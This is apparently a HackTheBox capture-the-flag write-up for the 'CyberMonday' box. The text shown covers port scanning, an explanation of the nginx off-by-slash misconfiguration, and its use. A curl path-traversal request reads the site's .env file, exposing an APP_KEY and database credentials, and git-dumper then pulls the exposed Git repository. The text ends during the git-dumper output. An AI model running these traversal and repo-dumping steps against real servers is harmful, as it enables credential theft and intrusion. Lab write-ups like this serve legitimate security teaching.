---
title: HTB: CyberMonday
url: https://0xdf.gitlab.io/2023/12/02/htb-cybermonday.html
date: 2023-12-02T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-cybermonday, ctf, hackthebox, nmap, debian, php, laravel, feroxbuster, off-by-slash, nginx, ffuf, gitdumper, source-code, mass-assignment, burp, burp-repeater, api, jwt, jwks, python-jwt, jwt-tool, jwt-algorithm-confusion, jwt-asymmetric, ssrf, ssrf-redis, redis, crlf-injection, laravel-deserialization, deserialization, redis-migrate, redis-blind, laravel-decrypt, phpggc, docker, container, escape, pivot, chisel, docker-registry, snyk, directory-traversal, file-read, docker-compose, docker-capabilities, docker-apparmor, docker-shocker, shocker, youtube, htb-pikaboo, htb-seal, htb-monitors, htb-talkative
---

![CyberMonday](/img/cybermonday-cover.png)

CyberMonday is a crazy difficult box, most of it front-loaded before the user flag. I’ll start with a website, and abuse an off-by-slash nginx misconfiguration to read a .env file and the Git source repo. I’ll find a mass assignment vulnerability in the site allowing me to get admin access, which provides a new subdomain for a webhooks API. I’ll enumerate that API to find it uses JWTs and asymmetric crypto. I’ll abuse that to forge a token and get admin access to the API, where I can create webhooks. One of webhooks allows me to get the server to issue web requests, like an SSRF. I’ll abuse that, with a CRLF injection to interact with the Redis database that’s caching the Laravel session data. I’ll abuse that to get code execution in the web container. From there, I’ll find a Docker Registry container, and pull the API container image. Source code review shows additional API endpoints with an additional header required. I’ll abuse those to get file read on the API container, and leak the password of a user that works for SSH. To get to root, I’ll abuse a script designed to allow a user to run docker compose in a safe way. I’ll show a couple ways to do this, most of which center around giving the container privileges. In Beyond Root, I look at where the Python JWT library prevented me from forging a JWT, and edit it to allow me. I’ll also look at the off-by-slash vulnerability in the nginx config.

## Box Info

| Name | [CyberMonday](https://hackthebox.com/machines/cybermonday)  [CyberMonday](https://hackthebox.com/machines/cybermonday) [Play on HackTheBox](https://hackthebox.com/machines/cybermonday) |
| --- | --- |
| Release Date | [19 Aug 2023](https://twitter.com/hackthebox_eu/status/1692173209414807819) |
| Retire Date | 02 Dec 2023 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for CyberMonday |
| Radar Graph | Radar chart for CyberMonday |
| First Blood User | 17:10:38[gumby gumby](https://app.hackthebox.com/users/187281) |
| First Blood Root | 18:29:29[Randominion Randominion](https://app.hackthebox.com/users/234175) |
| Creator | [Tr1s0n Tr1s0n](https://app.hackthebox.com/users/575442) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.228
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-27 20:14 EST
Nmap scan report for 10.10.11.228
Host is up (0.094s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.22 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.228
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-27 20:22 EST
Nmap scan report for 10.10.11.228
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.25.1
|_http-server-header: nginx/1.25.1
|_http-title: Did not follow redirect to http://cybermonday.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 11 bullseye.

The webserver is redirecting to `cybermonday.htb`. I’ll fuzz for subdomains using `ffuf`, but it doesn’t find anything. I’ll add `cybermonday.htb` to my `/etc/hosts` file and rescan port 80, but nothing new.

### cybermonday.htb - TCP 80

#### Site

The site is for an online store:

![image-20231127165735058](/img/image-20231127165735058.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There are two links on the page. One goes to the products page (`/products`):

![image-20231127165818683](/img/image-20231127165818683.png)

Viewing individual products offers a Buy button, but it doesn’t do anything:

![image-20231127165858826](/img/image-20231127165858826.png)

The login link presents a login form (`/login`):

![image-20231127165929749](/img/image-20231127165929749.png)

There’s a link to register (`/signup`):

![image-20231127165956974](/img/image-20231127165956974.png)

After logging in, there’s a “Home” link added to the menu bar (`/home`):

![image-20231127170053808](/img/image-20231127170053808.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

None of the things have links, except for “View profile” (`/home/profile`) which offers a chance to update my name, email, and password:

![image-20231127170130618](/img/image-20231127170130618.png)

#### Tech Stack

The HTTP response headers show that the server is nginx, and that the site is PHP:

```

HTTP/1.1 200 OK
Server: nginx/1.25.1
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/8.1.20
Cache-Control: no-cache, private
Date: Mon, 27 Nov 2023 21:31:47 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6InhyeGFUb0xIRkpxM1hueXovdWk1UlE9PSIsInZhbHVlIjoiNHpnYis4UCtPSkJkRklGbEpsT2xxT1F2MzR1clZWYng1Zy9adEJaK1gyajJkSWpndUZQY2pyRkpGWUlEK1V3b0grK3FIR2VVWTZxbWJrTUpnczNWb1U0UmRsdkUyNldzdURWSXBKZWxVQlYwK2JKelNjc0txYTRzaFJRRHFDUG0iLCJtYWMiOiIzNmU4ZWM1ZTkyYzMyMWUwYjQ1MGZkY2Q1MGMzNDg0YmQwMjBkMDMzNzY2N2U1NDRhMTczZjFhYTRlZTBiZTUwIiwidGFnIjoiIn0%3D; expires=Mon, 27 Nov 2023 23:31:47 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: cybermonday_session=eyJpdiI6Ild1dStIUGVVUEFWcm1YZ1BZYVBHNkE9PSIsInZhbHVlIjoiaVJlWEcyMndkbkpNSVlZRXdFWXZiaGJoNHF5a1hjbncxdFRtdm90RU1kNk9GTlpBWFhpcnpRWVRrK20rbDRuVHdkdnBIajZJQy9EZmxMUTFPV21HaTZUWXdmUkM5ZmpSekRLM0t2VFFINUxyT0hkSUk2OXByMXRnYmc1VjZacVUiLCJtYWMiOiI3ZjA2NmVhZjFlMzY2MDVmNmVlNTU3ZWQ0MWFlOTlkMTA3M2E3Mzg3MDg1YTgyMzY3ZDk5ZWUwYTA3YjIxYTE5IiwidGFnIjoiIn0%3D; expires=Mon, 27 Nov 2023 23:31:47 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Content-Length: 12721

```

The format of the two cookies being set looks very much like [Laravel](https://laravel.com/). I’ve shown this [several times before](/tags#laravel).

The main page will load as `index.php`.

The 404 page is the default Laravel 404 page:

![image-20231127174420233](/img/image-20231127174420233.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://cybermonday.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cybermonday.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       32l      137w     6603c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      239l      986w    12721c http://cybermonday.htb/
302      GET       12l       22w      358c http://cybermonday.htb/logout => http://cybermonday.htb/login
200      GET      121l      355w     5675c http://cybermonday.htb/login
301      GET        7l       11w      169c http://cybermonday.htb/assets => http://cybermonday.htb/assets/
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       11w      169c http://cybermonday.htb/assets/js => http://cybermonday.htb/assets/js/
301      GET        7l       11w      169c http://cybermonday.htb/assets/img => http://cybermonday.htb/assets/img/
301      GET        7l       11w      169c http://cybermonday.htb/assets/css => http://cybermonday.htb/assets/css/
301      GET        7l       11w      169c http://cybermonday.htb/assets/views => http://cybermonday.htb/assets/views/
301      GET        7l       11w      169c http://cybermonday.htb/assets/views/components => http://cybermonday.htb/assets/views/components/
301      GET        7l       11w      169c http://cybermonday.htb/assets/views/home => http://cybermonday.htb/assets/views/home/
301      GET        7l       11w      169c http://cybermonday.htb/assets/views/dashboard => http://cybermonday.htb/assets/views/dashboard/
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_cybermonday_htb-1701139285.state ...
[##>-----------------] - 7m     35487/270000  52m     found:11      errors:19165  
[##>-----------------] - 7m      3331/30000   7/s     http://cybermonday.htb/ 
[#>------------------] - 7m      2762/30000   6/s     http://cybermonday.htb/assets/ 
[#>------------------] - 6m      2462/30000   5/s     http://cybermonday.htb/assets/js/ 
[#>------------------] - 6m      2462/30000   5/s     http://cybermonday.htb/assets/img/ 
[#>------------------] - 6m      2462/30000   5/s     http://cybermonday.htb/assets/css/ 
[#>------------------] - 5m      1912/30000   5/s     http://cybermonday.htb/assets/views/ 
[#>------------------] - 4m      1612/30000   5/s     http://cybermonday.htb/assets/views/components/ 
[#>------------------] - 4m      1512/30000   5/s     http://cybermonday.htb/assets/views/home/ 
[>-------------------] - 2m       712/30000   4/s     http://cybermonday.htb/assets/views/dashboard/ 

```

I’ll kill it after several minutes because it is just grindingly slow.

## Find Webhook Subdomain

### Access Source

#### Off-By-Slash Background

nginx has a common misconfiguration known as “off-by-slash”. I’ve run into this before in [Pikaboo](/2021/12/04/htb-pikaboo.html#off-by-slash) and [Seal](/2021/11/13/htb-seal.html#access-tomcat-manager). It is common with nginx for a site to want to use an alias to change how certain files are accessed. This configuration is really common with static assets.

For example, something like this:

```

location /static/ {
    alias /var/www/site/static/
}

```

When someone visits `/static/main.js`, the webserver returns `/var/www/site/static/main.js`.

The issue comes if the configuration leaves off the trailing `/` in the top line:

```

location /static {
    alias /var/www/site/static/
}

```

The case of `/static/main.js` still works, returning `/var/www/site/static//main.js`. Because of how Linux handles double slashes in file system paths, this isn’t an issue. But, if I instead visit `/static../flag.txt`, then nginx rewrites that as `/var/www/site/static/../flag.txt`, allowing me to read out of the parent directory!

#### Testing for Off-By-Slash

The `feroxbuster` above shows a `/assets` directory. To test for off-by-slash, I’ll try to visit `/assets../`. If the server is configured properly, that would miss the re-write entirely, and return a 404. But if it returns some other status code, that indicates the directory traversal worked.

It returns 403:

![image-20231127181913731](/img/image-20231127181913731.png)

#### .env

Laravel stores all it’s sensitive information in a `.env` file at the project root. I’ll download that successfully:

```

oxdf@hacky$ curl http://cybermonday.htb/assets../.env
APP_NAME=CyberMonday
APP_ENV=local
APP_KEY=base64:EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=
APP_DEBUG=true
APP_URL=http://cybermonday.htb

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=db
DB_PORT=3306
DB_DATABASE=cybermonday
DB_USERNAME=root
DB_PASSWORD=root

BROADCAST_DRIVER=log
CACHE_DRIVER=file
FILESYSTEM_DISK=local
QUEUE_CONNECTION=sync
SESSION_DRIVER=redis
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=redis
REDIS_PASSWORD=
REDIS_PORT=6379
REDIS_PREFIX=laravel_session:
CACHE_PREFIX=

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS="hello@example.com"
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"

CHANGELOG_PATH="/mnt/changelog.txt"

REDIS_BLACKLIST=flushall,flushdb

```

The information here is very subtle, but there is some:
- The `APP_KEY` will be useful if I get an opportunity for a deserialization attack.
- There’s creds to the MySQL database as well.
- There’s a Redis configuration, which based on the `REDIS_PREFIX` seems to be caching the session cookies.
- Two Redis commands are blocked from the web app, `flushall` and `flushdb`.
- Each of the database configurations have a different hostname, `db` and `redis`. This implies there’s likely containers running on CyberMonday.
- The second to last item is `CHANGELOG_PATH="/mnt/changelog.txt"`. `/mnt` is an interesting place to have something stored, as it implies another drive. If this is in a container, perhaps it’s from the host.

#### Fuzz

I’ll use `ffuf` to brute force other files in that root directory:

```

oxdf@hacky$ ffuf -u http://cybermonday.htb/assets../FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cybermonday.htb/assets../FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 94ms]
.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 95ms]
.git                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 95ms]
.gitattributes          [Status: 200, Size: 152, Words: 9, Lines: 11, Duration: 95ms]
.gitignore              [Status: 200, Size: 179, Words: 1, Lines: 15, Duration: 96ms]
.git/index              [Status: 200, Size: 12277, Words: 75, Lines: 76, Duration: 94ms]
admin.php               [Status: 404, Size: 6603, Words: 432, Lines: 33, Duration: 257ms]
app                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 92ms]
config                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 92ms]
database                [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 92ms]
index2.php              [Status: 404, Size: 6603, Words: 432, Lines: 33, Duration: 207ms]
index.php               [Status: 404, Size: 6603, Words: 432, Lines: 33, Duration: 321ms]
info.php                [Status: 404, Size: 6603, Words: 432, Lines: 33, Duration: 258ms]
index3.php              [Status: 404, Size: 6603, Words: 432, Lines: 33, Duration: 344ms]
infos.php               [Status: 404, Size: 6603, Words: 432, Lines: 33, Duration: 358ms]
lang                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 91ms]
phpinfos.php            [Status: 404, Size: 6603, Words: 432, Lines: 33, Duration: 208ms]
phpinfo.php             [Status: 404, Size: 6603, Words: 432, Lines: 33, Duration: 283ms]
public                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 91ms]
resources               [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 92ms]
routes                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 92ms]
storage                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 92ms]
tests                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 91ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 93ms]
xmlrpc.php              [Status: 404, Size: 6603, Words: 432, Lines: 33, Duration: 240ms]
:: Progress: [4713/4713] :: Job [1/1] :: 396 req/sec :: Duration: [0:00:11] :: Errors: 0 ::

```

The most interesting is the `.git` directory, as that will show most of the rest of the files.

#### Get Git Repo

I’ll use [git-dumper](https://github.com/arthaud/git-dumper) to pull the `.git` repo from the webserver:

```

oxdf@hacky$ git-dumper http://cybermonday.htb/assets../ git/
[-] Testing http://cybermonday.htb/assets../.git/HEAD [200]
[-] Testing http://cybermonday.htb/assets../.git/ [403]
[-] Fetching common files
[-] Fetching http://cybermonday.htb/assets../.git/description [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/post-commit.sample [404]
[-] http://cybermonday.htb/assets../.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/COMMIT_EDITMSG [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://cybermonday.htb/assets../.gitignore [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/post-receive.sample [404]
[-] http://cybermonday.htb/assets../.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/hooks/post-update.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/pre-commit.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/commit-msg.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/pre-receive.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/update.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/index [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/info/packs [404]
[-] http://cybermonday.htb/assets../.git/objects/info/packs responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/info/exclude [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/pre-push.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/pre-rebase.sample [200]
[-] Finding refs/
[-] Fetching http://cybermonday.htb/assets../.git/FETCH_HEAD [404]
[-] http://cybermonday.htb/assets../.git/FETCH_HEAD responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/HEAD [200]
[-] Fetching http://cybermonday.htb/assets../.git/ORIG_HEAD [404]
[-] http://cybermonday.htb/assets../.git/ORIG_HEAD responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/config [200]
[-] Fetching http://cybermonday.htb/assets../.git/logs/HEAD [200]
[-] Fetching http://cybermonday.htb/assets../.git/info/refs [404]
[-] http://cybermonday.htb/assets../.git/info/refs responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/logs/refs/heads/master [200]
[-] Fetching http://cybermonday.htb/assets../.git/logs/refs/remotes/origin/HEAD [404]
[-] http://cybermonday.htb/assets../.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/logs/refs/stash [404]
[-] http://cybermonday.htb/assets../.git/logs/refs/stash responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/logs/refs/remotes/origin/master [404]
[-] http://cybermonday.htb/assets../.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/packed-refs [404]
[-] http://cybermonday.htb/assets../.git/packed-refs responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/refs/remotes/origin/HEAD [404]
[-] http://cybermonday.htb/assets../.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/refs/heads/master [200]
[-] Fetching http://cybermonday.htb/assets../.git/refs/remotes/origin/master [404]
[-] http://cybermonday.htb/assets../.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/refs/stash [404]
[-] http://cybermonday.htb/assets../.git/refs/stash responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/refs/wip/wtree/refs/heads/master [404]
[-] http://cybermonday.htb/assets../.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/refs/wip/index/refs/heads/master [404]
[-] http://cybermonday.htb/assets../.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://cybermonday.htb/assets../.git/objects/1d/69f3a2890599c4f51f93e1906f44d64f5eb928 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/8f/ed97c014194eee5a0d02fbf61d93b17162402a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/67/fcbbd6c89c6deaa0ffc3bec50d66a36406718a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/65/98e2c0607332658ab9d429e86b2da1130f2326 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/40/c55f65c25644d4f09d3c734b219a2aa736b134 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/f4/39e6a6a358e6effbc092f837e88311ce3e6712 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/eb/6fa48c25d93f7bf753ba612cd2c7efecea5f4b [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/03/7e17df03b0598d7bbd27ed333312e8e337fb1b [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/72/4b5ace57ad1b9a16bd3b579c665e9d26ffb0be [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/b6/10c22de02a2611915648294317192109b07aa8 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/ea/87f2e57d00c8b5176c144e2d6c58e43f0eace8 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0a/ce530e8d25451c7caf81ebdecac2cca9a77d83 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/23/45a56b5a6927a286e99ff80efc963ea3422e0c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/47/3deba1cfc7d8eb1624b0a3f677b8b7f7837da6 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/fc/87b2971c5cb8fd6b25032d093d71513d06d07a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e9/d9dbdbe8ad384c1ea73b5f06bf9b9daa18007d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/91/a63d8dd88b90cc6cedd501364440527c7bca9a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/ee/8ca5bcd8f77d219f29529a9163587235c545d5 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/f2/c31ba3685cf854c57fa5bb1565f86dc46630c6 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e9/96d67d71fbda2243b3ca9b41603a3215eab1b7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/93/6d9ad1901c231d7f5359dbd5ecdb2b3345675e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/ef/76a7ed6aece96a22282683c9832f658d41dad7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/69/22577695e66ffdb3803e559490798898341abc [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/79/f63b44fdcb02187831898cd3732301fa3b7488 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/51/0d9961f10a033fa6a602129eb0e24ebe32e146 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/ab/0a1c2c7005cd000efabbcc3919dbc78e4b0f5d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/17/191986b47f67e56c7e34e306ffe1f236501fb6 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/5a/0039662c1d3823d77d2a0bff5088f68a8ce54a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0a/8a4d32f60dbb9941b88ed67b521f5cab4eac36 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/7d/5e9e15b9429f0f49c4d4e00e55d820260c5179 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0a/abca19f99f35ce39fc788f7070e2b9bc0d3108 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/86/7695bdcff312bfa221d583e2b3223aab2426dd [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/3e/c37a22439b3c9be8e85e4cca5e5666cd0cbd53 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/3a/ec5e27e5db801fa9e321c0a97acbb49e10908f [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e0/5f4c9a1b27a35c20ac897b44dfb7a9238ff9b7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e7/3b8366158995ef7dd236f7119db0641931b358 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/25/ea5a819352e0fa8bacc367dd0cb39b71292c4f [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/8f/f3c9029c202012a5a0a3cff159d47cb4f3beab [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/05/c4471f2b53fc17d3cac9d3d252755a35479f7c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/ba/ba3681999751b0d1d2139aa2817dc730608f0e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/6b/0afd0b51ad8dacac31ce7e316398ec4c3e4b82 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/67/a3329b183e042b14516122b5d470bc337a5a90 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/78/ccc21f46a8df7435c5514691eb821a04b28aae [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/9e/86521722b083582f0f100e7b4d3a63bcc1bdfc [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/4c/573f4f204dbc36ab70a67606f366646a91344e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/f1/71ecacc26252f4ba333eb804883e6f01e376aa [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a8/73d608f3ae94f0bd8243a9573d627660c48bdc [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/71/86414c65794159f1a16a052921c44130463b4e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/39/5c518bc47b94752d00b8dc7aeb7d241633e7cf [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/52/9cfdc9916c1bd990016e2d8789895873908548 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/c8/e7f76ffb52fc942e3de0a9dcc5261e051d76bf [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/bc/67a663bb443bbace06a0a47247273172f9a8e6 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/bb/9945c3b6ed4d3d4c9afde3093f51d3ab4c3ad7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d0/04bbfe4a971a42548db1c28022ad83a5fe7bed [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/9e/b7bd2831e242775751b2c54dcc52fe92dae34a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/23/b61d24286d5e2ad9b01ccc2cef12511a0d835d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/46/4c26155d71f0317cf3113d1d18dab569a401f0 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/74/cbd9a9eaaaf10a0a748f707729e62c8ce4b05c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/51/b351b0b3527e399cbbeb9d1361af9ba03fbb9e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d2/5e46f9de6d52e2c5682604989a1bee56af30d7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/16/71c9b9d94ae80b2d39c6b6a64d154b0ac6cb65 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d4/8141187786931ec2cf8645e384be7878c7dc53 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/f4/21db2c26bd69264849c992e70e529fde0704ea [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/34/28efe948369749e99dba20560cc28211e069f1 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/53/4395a369bf31a7cc4da747887882588bed258f [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/08/ef22210ae6291c9a7c25136b050379fc968124 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/2a/22dc1206aefa36f8f32a6839219094d7acd0c1 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/b5/a448dc774d545609f3ee8a166a4eeef01f33c9 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/5d/451e1fae88c81c097aa55de6ff039a3cc0a1c3 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a0/a2a8a34a6221e4dceb24a759ed14e911f74c57 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d8/c6cee7c19c410449b5b9458bde053ae8f5bda0 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/ab/8b2cf77bbfa9c44bc228e2b71c2fed039d8e43 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/7a/9aecdf303df17e84c167d05c5d6cdd66981d23 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/c8/3d34aaaf8706bd525ca4dc35c0348332c65774 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/8a/39e6daa63dd3a4c07693f728ff136c05a3ed6e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d8/bc1d29f0ca5533beb6106f170b14fce854269d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/5a/a1dbb78815158ce20421d5099ede9b965e0a26 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/22/b8a18d325814f221fb0481fa7ab320b612d601 [200]
